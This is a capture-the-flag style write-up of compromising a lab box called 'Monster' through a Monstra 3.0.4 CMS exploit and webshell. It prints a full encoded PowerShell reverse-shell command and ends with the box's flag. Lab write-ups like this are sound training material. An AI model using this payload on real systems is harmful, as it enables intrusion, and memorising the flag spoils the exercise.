# Monster 🔹

## Enumeration

![](../assets/Pasted%20image%2020250313201347.png)

Web server

![](../assets/Pasted%20image%2020250313202342.png)

Using feroxbuster we discover blog by monstra 3.0.4

![](../assets/Pasted%20image%2020250313203003.png)

And the admin panel

![](../assets/Pasted%20image%2020250313203157.png)

Addin monster.pg to /etc/hosts

![](../assets/Pasted%20image%2020250313204511.png)

## Initial Access

Trying password we enter with `admin:wazowski`

![](../assets/Pasted%20image%2020250313204626.png)

Using searchsploit

![](../assets/Pasted%20image%2020250313204716.png)

We get 52038.py but we have to edit it and give it indentation

![](../assets/Pasted%20image%2020250313205444.png)

Going to that url we see the webshell

![](../assets/Pasted%20image%2020250313205518.png)

Putting an encode powerhsell reverse shell and starting a listener we get a reverse shell

```bash
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMwA2ACIALAA5ADkAOQA5ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
```

![](../assets/Pasted%20image%2020250313205924.png)

## Privilege Escalation

Get local flag

![](../assets/Pasted%20image%2020250313211111.png)

![](../assets/Pasted%20image%2020250313220046.png)

![](../assets/Pasted%20image%2020250313220133.png)

Transfer the script after generating a msfvenom reverse shell and change the path to it in the script.

![](../assets/Pasted%20image%2020250313232428.png)

Wait after executing it and

![](../assets/Pasted%20image%2020250313232449.png)
## PostExploitation

Get the flag

328bcd8e88c080b9e39f45b243c8a8e6